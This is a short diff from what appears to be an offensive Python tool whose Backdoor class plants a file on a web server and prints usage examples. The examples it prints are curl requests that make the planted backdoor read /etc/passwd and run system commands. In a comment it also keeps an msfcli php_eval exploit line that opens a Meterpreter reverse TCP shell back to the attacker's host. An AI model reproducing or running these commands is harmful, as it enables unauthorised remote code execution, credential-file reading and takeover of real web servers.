@@ -149,7 +149,7 @@ class Backdoor(object):
             make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
             uri = folder[len(wwwroot):]
-            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tmsfcli "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"\n[i]\tmsfcli exploit/unix/webapp/php_eval RHOST={1} RPORT=80 PHPURI={2}/{3}?{4}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={5}{6} LPORT=4444 E'.format(Colors.GREEN, ip, uri, filename, parameter, ourIP, Colors.END)  # Need to add  http or https infront
+            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"'.format(Colors.GREEN, ip, uri, filename, parameter, ourIP, Colors.END)  # Need to add  http or https infront ~ \n[i]\tmsfcli exploit/unix/webapp/php_eval RHOST={1} RPORT=80 PHPURI={2}/{3}?{4}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={5}{6} LPORT=4444 E
         else:
             print '\n{0}[!] Unable to find a writable directory'.format(Colors.RED, Colors.END)
 
